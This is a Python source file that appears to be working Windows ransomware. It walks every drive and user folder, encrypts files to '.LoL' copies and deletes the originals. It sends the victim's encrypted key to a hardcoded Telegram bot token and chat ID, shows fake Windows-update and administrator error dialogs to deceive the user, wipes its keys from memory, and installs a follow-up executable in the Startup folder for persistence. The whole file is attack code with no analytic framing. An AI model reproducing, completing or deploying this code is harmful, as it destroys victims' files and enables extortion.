import telegram, asyncio                  
from nacl.public import PrivateKey, PublicKey, Box   
import nacl, nacl.secret
from datetime import datetime             
from time import sleep               
import os, sys, ctypes, tkinter    
from tkinter import messagebox
from threading import Thread
import threading
import time
from multiprocessing import Process
from PIL import Image, ImageDraw, ImageFont
from tkinter import Label, Entry
import subprocess
import pathlib
import shutil

fileName=sys.argv[0]
afterFileName='Client_after_enc.exe'

PRIVATE_KEY_RSA=0
PUBLIC_KEY_RSA=0
PRIVATE_KEY_AES=0
PUBLIC_SERVER_RSA_KEY=PublicKey(b'A?\xb6\xdcJ\x02e1-\xbfN9BWkY\x13B+\x02\x03\xfa\xe5\xfb)\xf5}\x92\x83\x91\xb4E')

AES_BOX=0

BOT=telegram.Bot(token='6516628933:AAHr__4L6DnlSiBXptkMsKi8DhvPwanGrJQ')
CHAT_ID=5911780078

EncryptModule=0

MaxThread=120
ThreadPool=[]
IsAdmin=ctypes.windll.shell32.IsUserAnAdmin()

PathList=[]

def makeRSAKey():
    global PRIVATE_KEY_RSA, PUBLIC_KEY_RSA
    PRIVATE_KEY_RSA=PrivateKey.generate()
    PUBLIC_KEY_RSA=PRIVATE_KEY_RSA.public_key

def makeAESKey():
    global PRIVATE_KEY_AES
    PRIVATE_KEY_AES=nacl.utils.random(nacl.secret.SecretBox.KEY_SIZE)

def encryptAES():
    global AES_BOX
    AES_BOX=Box(PRIVATE_KEY_RSA, PUBLIC_SERVER_RSA_KEY)
    encrypted_aes_key=AES_BOX.encrypt(PRIVATE_KEY_AES)
    return encrypted_aes_key

async def sendTelegram(chat_id, msg):
    await BOT.send_message(chat_id, msg)
    
def sendKeyToServer(encrypted_aes_key):
    loop = asyncio.get_event_loop() 
    loop.run_until_complete(
        sendTelegram(CHAT_ID, "ClientRSAPublicKey: "+str(PUBLIC_KEY_RSA)+
                     " \n\n"+"EncryptedClientAESKey: "+str(encrypted_aes_key)))

class Encryptor:
    def __init__(self, files=0):
        self._files=files

    @classmethod
    def encEach(self, path):
        try:
            with open(path, "rb") as File:
                data=File.read()
            encryptedFile=EncryptModule.encrypt(data)
            with open(f"{path}.LoL", "wb") as File:
                File.write(encryptedFile)
            os.remove(path)
        except (PermissionError, FileNotFoundError):
            if(os.path.isfile(f"{path}.LoL")):
                os.remove(f"{path}.LoL")

    def encryptFile(self):
        for file in self._files:
            if(os.path.isfile(file)==True):
                if(file==sys.argv[0] or afterFileName in file):
                    return
                    
                try:
                    if(os.path.getsize(file)>500000000):
                        if (len(ThreadPool)<MaxThread):
                            th=Thread(target=Encryptor.encEach, args=(file,))
                            ThreadPool.append(th)
                            th.start()
                        else:
                            self.encEach(file)
                    else:
                        self.encEach(file)
                except Exception as e:
                    pass

def setEncryptModule():
    global EncryptModule
    EncryptModule=nacl.secret.SecretBox(PRIVATE_KEY_AES)

def listUpTargetDir():
    global PathList
    PathList=[r"C:\Users\\", r"C:\Program Files\\", r"C:\Program Files (x86)\\"]
    for letter in range(97, 123):
        drive=f"{chr(letter)}:\\"
        if (pathlib.Path(drive).exists()):
            PathList.append(drive)
    PathList.remove("C:\\")

def recursiveEncrypt(basepath):
    try:
        files=[]
        dirs=[]
        for entry in os.listdir(basepath):
            absolutePath=os.path.join(basepath, entry)
            if os.path.isfile(absolutePath):
                files.append(absolutePath)
            elif os.path.isdir(absolutePath):
                dirs.append(absolutePath)

        if (len(files)>0):
            Encryptor(files).encryptFile()
        for dir in dirs:
            recursiveEncrypt(dir)
    except Exception as e:
        pass

#기타 함수
def fakeAdmin():
    WINDOW=tkinter.Tk()
    WINDOW.withdraw()
    messagebox.showerror("Error", "Try to re-run as administrator")

def fakeAlert():
    WINDOW=tkinter.Tk()
    WINDOW.withdraw()
    messagebox.showerror("Windows 업데이트 진행 중...", "컴퓨터를 끄지 마십시오")

def dumpVariable():
    global PRIVATE_KEY_RSA, PUBLIC_KEY_RSA, PRIVATE_KEY_AES, PUBLIC_SERVER_RSA_KEY, AES_BOX, BOT, CHAT_ID, EncryptModule
    PRIVATE_KEY_RSA=os.urandom(sys.getsizeof(PRIVATE_KEY_RSA)+1)
    PUBLIC_KEY_RSA=os.urandom(sys.getsizeof(PUBLIC_KEY_RSA)+1)
    PRIVATE_KEY_AES=os.urandom(sys.getsizeof(PRIVATE_KEY_AES)+1)
    PUBLIC_SERVER_RSA_KEY=os.urandom(sys.getsizeof(PUBLIC_SERVER_RSA_KEY)+1)
    AES_BOX=os.urandom(sys.getsizeof(AES_BOX)+1)
    BOT=os.urandom(sys.getsizeof(BOT)+1)
    CHAT_ID=os.urandom(sys.getsizeof(CHAT_ID)+1)
    EncryptModule=os.urandom(sys.getsizeof(EncryptModule)+1)
    
def doEnc():
    for drive in PathList:
        recursiveEncrypt(drive)
    while (len(ThreadPool)!=0):
        th=ThreadPool.pop()
        th.join()
        
    dumpVariable()
    try:
        shutil.copyfile(afterFileName, r"C:\\Users\\user\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Client_after_enc.exe")
    except Exception as e:
        pass
        
    os.system(afterFileName)
    sys.exit()
            
if __name__=='__main__':
    makeRSAKey()
    makeAESKey()
    encrypted_aes_key=encryptAES()
    sendKeyToServer(encrypted_aes_key)
    setEncryptModule()
    listUpTargetDir()
    
    if(IsAdmin==True):
        t=Thread(target=doEnc)
        t.start()
        fakeAlert()
        t.join()
    else:
        fakeAdmin()
    
